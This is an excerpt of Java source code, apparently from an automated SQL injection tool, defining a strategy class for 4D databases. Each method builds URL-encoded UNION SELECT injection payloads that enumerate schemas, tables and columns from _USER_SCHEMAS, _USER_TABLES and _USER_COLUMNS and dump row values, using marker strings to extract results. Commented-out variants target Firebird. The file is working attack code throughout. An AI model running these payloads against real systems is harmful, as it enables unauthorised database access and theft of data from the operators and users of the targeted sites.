...
public class FourthDStrategy implements ISQLStrategy {

    @Override
    public String getSchemaInfos() {
        return 
            "SELECT+concat('-{%}-{%}-{%}-%01%03%03%07')from+_USER_SCHEMAS";
    }

    @Override
    public String getSchemaList() {//select * from _USER_SCHEMAS
        return 
            /**
...
//            "select+'%04'||rdb$get_context('SYSTEM','DB_NAME')||'%050%04%01%03%03%07'from+rdb$database{limit}";
            "select+concat(concat('%04',schema_name),'%050%04%01%03%03%07')from+_USER_SCHEMAS{limit}";
    }

    @Override
    public String getTableList(Database database) {//select * from _USER_TABLES
        return
//            "SELECT'%04'||trim(rdb$relation_name)||'%050%04%01%03%03%07'from+rdb$relations{limit}";
            "select+concat(concat('%04',table_name),'%050%04%01%03%03%07')from+_USER_TABLES{limit}";
    }

    @Override
    public String getColumnList(Table table) {//select * from _USER_COLUMNS
        return
//            "SELECT'%04'||trim(rdb$field_name)||'%050%04%01%03%03%07'from+rdb$relation_fields+where+rdb$relation_name='" + table + "'{limit}";
            "select+concat(concat('%04',column_name),'%050%04%01%03%03%07')from+_USER_COLUMNS+where+table_name='" + table + "'{limit}";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, ",'')),'%7f'),concat(trim(coalesce(");
        formatListColumn = "concat(trim(coalesce(" + formatListColumn + ",'')))";
        
        return
            "SELECT+concat(concat('%04'," + formatListColumn + "),'%050%04%01%03%03%07')from+" + database + "." + table + "{limit}";
    }
    ...
    public String normalStrategy(String sqlQuery, String startPosition) {
        return 
            "select+" +
                 ...
                 */
                 "concat(concat('SQLi',NULLIF(substring(" +
                 "(" + sqlQuery + ")from+" +
                 startPosition + 
     ...
     public String performanceQuery(String[] indexes) {
         return 
             MediatorModel.model().initialQuery.replaceAll(
                 ...
                 "(select+concat('SQLi$1',repeat('%23',1024))from+_USER_SCHEMAS+limit+1)"
             );
     }
    ...
    public String initialQuery(Integer nbFields) {
        ...
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "+from+_USER_SCHEMAS+limit+1--+";
    }
    ...
    public String getLimit(Integer limitSQLResult) {
        return "+limit+1+offset+" + limitSQLResult;
    }
